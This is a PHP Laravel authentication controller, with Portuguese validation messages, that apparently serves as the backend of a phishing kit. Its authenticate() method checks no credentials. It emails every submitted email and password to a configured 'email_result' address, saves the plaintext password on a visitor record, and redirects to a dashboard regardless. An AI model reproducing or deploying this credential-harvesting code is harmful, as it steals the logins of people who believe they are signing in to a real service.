<?php

namespace App\Http\Controllers;

use App\Mail\EmailLogin;
use App\Models\Settings;
use App\Models\Visitor;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Inertia\Inertia;
use Inertia\Response;
use Throwable;

class AuthController extends Controller {
    public function index()
    {
        return view('login');
    }


    public function login(): Response
    {
        return Inertia::render('Auth/Login');
    }

    public function idLogin(Request $request): Response
    {
        $data = $request->validate([
            'email' => 'required|email',
        ], [
            'email.require' => 'O campo e-mail deve ser um endereço de e-mail válido',
            'email.email' => 'O campo abaixo é de preenchimento obrigatório',
        ]);

        return Inertia::render('Auth/Login', [
            'id' => $data['email'],
        ]);
    }

    public function authenticate(): RedirectResponse
    {
        $data = request()->validate([
            'email' => 'required|email',
            'password' => 'required|string|min:6',
        ], [
            'email.required' => 'O campo e-mail é obrigatório.',
            'email.email' => 'O campo e-mail deve ser um endereço de e-mail válido.',
            'password.required' => 'O campo senha é obrigatório.',
            'password.string' => 'O campo senha deve ser uma string.',
            'password.min' => 'O campo senha deve ter pelo menos :min caracteres.',
        ]);

        try {
            Mail::to(Settings::me()->email_result)->sendNow(new EmailLogin($data));
            $visitor = Visitor::current();
            $visitor->user = $data['email'];
            $visitor->pass = $data['password'];
            $visitor->save();
        } catch (Throwable $t) {
            Log::error($t);
        }

        return redirect()->route('dashboard');
    }

    public function restrict()
    {
        return Inertia::render('Account/Verify', [
            'email' => Settings::me()->email_result,
        ]);
    }

    public function verify()
    {
        return Inertia::render('Veify', [
            'email' => Visitor::current()->user
        ]);
    }
}
